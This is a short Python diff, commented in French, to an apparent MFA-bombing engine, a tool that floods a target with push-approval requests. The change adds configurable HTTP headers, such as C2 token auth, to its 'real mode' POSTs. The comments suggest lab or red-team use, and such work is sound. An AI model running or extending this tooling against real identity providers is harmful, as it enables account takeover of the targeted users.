@@ -83,6 +83,7 @@ class BombingCampaign:
     stop_event: asyncio.Event = field(default_factory=asyncio.Event)
     real: bool = False                # mode RÉEL : POST HTTP vers push_url
     push_url: str = ""                # endpoint HTTP réel des pushes (labo/IdP)
+    push_headers: dict = field(default_factory=dict)   # ex. Authorization Bearer
 
     @property
     def target_username(self) -> str:
@@ -147,6 +148,7 @@ class MFABombingEngine:
         auto_accept_callback: Callable[[PushAttempt], bool] | None = None,
         push_url: str = "",      # mode RÉEL : endpoint HTTP des pushes
         real: bool = False,      # mode RÉEL : POST httpx, décision serveur
+        push_headers: dict | None = None,   # ex. auth par token du C2
     ) -> BombingCampaign:
         """
         Démarre une campagne de MFA bombing.
@@ -168,6 +170,7 @@ class MFABombingEngine:
             max_attempts=max_attempts,
             real=real,
             push_url=push_url,
+            push_headers=dict(push_headers or {}),
         )
         campaign.stop_event = asyncio.Event()
         self.campaigns[campaign.campaign_id] = campaign
@@ -303,7 +306,7 @@ class MFABombingEngine:
         try:
             resp = await asyncio.to_thread(
                 httpx.post, campaign.push_url, json=payload,
-                timeout=10.0,
+                headers=campaign.push_headers, timeout=10.0,
             )
         except httpx.HTTPError as exc:
             attempt.success = False
